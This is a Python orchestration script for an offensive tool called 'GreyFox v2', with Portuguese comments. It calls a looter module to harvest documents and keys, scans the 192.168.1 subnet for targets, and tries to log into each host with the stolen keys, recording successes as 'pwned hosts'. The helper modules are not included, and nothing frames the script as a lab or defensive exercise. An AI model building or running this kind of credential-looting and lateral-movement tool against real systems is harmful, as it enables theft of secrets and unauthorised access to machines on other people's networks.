import os
from looter import search_secrets
from scanner import start_scan
from mover import try_move

def get_next_scan_folder(base_path):
    """Cria pastas incrementais como scan1, scan2..."""
    i = 1
    while os.path.exists(os.path.join(base_path, f"scan{i}")):
        i += 1
    new_path = os.path.join(base_path, f"scan{i}")
    os.makedirs(new_path)
    return new_path

def main():
    # 1. Configura diretório de resultados
    base_results = "results"
    if not os.path.exists(base_results):
        os.makedirs(base_results)
    
    current_scan_path = get_next_scan_folder(base_results)
    print(f"=== GreyFox v2: Sessão {os.path.basename(current_scan_path)} ===")

    # 2. Looting (Passando o caminho da pasta atual)
    keys = search_secrets(current_scan_path)
    print(f"[+] Documentos e chaves salvos em: {current_scan_path}")

    # 3. Scanning
    network_prefix = "192.168.1" # Ajuste conforme sua rede
    targets = start_scan(network_prefix, current_scan_path)
    print(f"[+] Alvos identificados: {len(targets)}")

    # 4. Movimentação
    for ip in targets:
        for key in keys:
            if "key_" in key:
                if try_move(ip, key):
                    log_file = os.path.join(current_scan_path, "pwned_hosts.txt")
                    with open(log_file, "a") as f:
                        f.write(f"SUCESSO: {ip} acessado via {key}\n")
                    print(f"[!!!] ACESSO CONFIRMADO: {ip}")

if __name__ == "__main__":
    main()